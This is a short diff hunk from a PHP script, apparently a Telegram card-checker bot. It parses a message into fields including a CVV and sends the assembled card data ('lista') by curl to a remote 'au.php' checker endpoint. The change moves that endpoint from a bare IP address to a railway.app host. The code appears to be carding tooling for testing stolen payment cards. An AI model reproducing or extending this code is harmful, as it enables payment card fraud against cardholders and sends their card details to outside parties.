@@ -27,7 +27,7 @@ $cvv = multiexplode(array(":", "/", " ", "|"), $message)[3];
       $mes_id = $sent['result']['message_id'];
   
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'http://46.29.161.167//modules/au.php?lista='.$lista.'');
+curl_setopt($ch, CURLOPT_URL, 'https://smkchk.up.railway.app//modules/au.php?lista='.$lista.'');
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 $fimaa = curl_exec($ch);
